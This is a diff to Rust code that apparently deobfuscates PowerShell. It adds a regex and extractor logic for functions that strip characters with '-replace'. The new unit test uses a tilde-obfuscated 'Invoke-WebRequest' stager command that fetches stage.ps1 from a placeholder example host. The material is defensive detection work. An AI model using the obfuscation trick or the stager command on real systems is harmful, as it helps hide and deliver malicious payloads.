@@ -1063,6 +1063,14 @@ static PS_LITERAL_REPLACE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static PS_LITERAL_CONST_REPLACE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?-(?:[ic])?replace\s+((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*,\s*((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))"#,
+    )
+    .expect("ps literal const replace extractor body regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_LITERAL_DOT_REPLACE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Replace\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
@@ -3670,7 +3678,10 @@ fn expand_literal_replace_extractor_calls(text: &str) -> String {
             continue;
         }
 
-        let Some(caps) = PS_LITERAL_CONST_DOT_REPLACE_EXTRACTOR_BODY_RE.captures(&body) else {
+        let Some(caps) = PS_LITERAL_CONST_REPLACE_EXTRACTOR_BODY_RE
+            .captures(&body)
+            .or_else(|| PS_LITERAL_CONST_DOT_REPLACE_EXTRACTOR_BODY_RE.captures(&body))
+        else {
             continue;
         };
         let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
@@ -8504,6 +8515,23 @@ Clean 'I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~c~o~n
                 "'Invoke-WebRequest -Uri https://ps-const-dot-replace-extractor.example/stage.ps1'"
             ),
             "constant dot-replace extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_constant_dash_replace_extractor_call_is_rewritten() {
+        let text = r#"function Clean($value) {
+  return $value -replace '~',''
+}
+Clean 'I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~c~o~n~s~t~-~d~a~s~h~-~r~e~p~l~a~c~e~-~e~x~t~r~a~c~t~o~r~.~e~x~a~m~p~l~e~/~s~t~a~g~e~.~p~s~1'"#;
+
+        let out = expand_literal_replace_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-const-dash-replace-extractor.example/stage.ps1'"
+            ),
+            "constant dash-replace extractor call was not rewritten:\n{out}"
         );
     }
 
